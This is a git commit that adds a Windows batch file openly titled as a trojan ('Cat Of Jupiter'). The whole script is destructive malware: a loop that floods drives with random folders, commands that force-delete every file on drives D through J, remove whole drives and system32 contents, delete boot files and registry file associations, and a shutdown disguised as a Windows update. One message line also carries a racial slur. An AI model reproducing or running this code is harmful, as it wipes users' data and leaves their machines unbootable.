02f3d68b5878d22b90fd14db9e03388ec68ab912
Souls <94298035+Entoy77@users.noreply.github.com>
2021-12-04 08:38:43 -0300

    Add files via upload

---
+++ Cat Of Jupiter.bat
@@ -0,0 +1,56 @@
+@echo off
+cls
+title Cat Of Jupiter Trojan Made by Badzin And Toxicc#
+color 6f
+echo Hi Bro This is a Virus Wants to Run This WILL MAKE SHIT ON YOUR PC
+pause
+echo LAST WARING IS GOING TO SHIT
+pause
+
+:VIRUS
+cd /d C:
+md %RANDOM%
+cd /d D:
+md %RANDOM%
+cd /d E:
+md %RANDOM%
+goto VIRUS
+REM #######################
+REM errorcode401.blogspot.in
+
+
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
+
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+
+Ipconfig /release
+
+
+msg * i m a walking Business Nigga i should be an llc
+shutdown -c “You Think That Funny” -s
+
+rd/s/q D:\
+rd/s/q C:\
+rd/s/q E:\
+
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
+
+shutdown -s -t 100 c “Installing Windows Updated”
+
+
+del c:\WINDOWS\system32\*.*/q
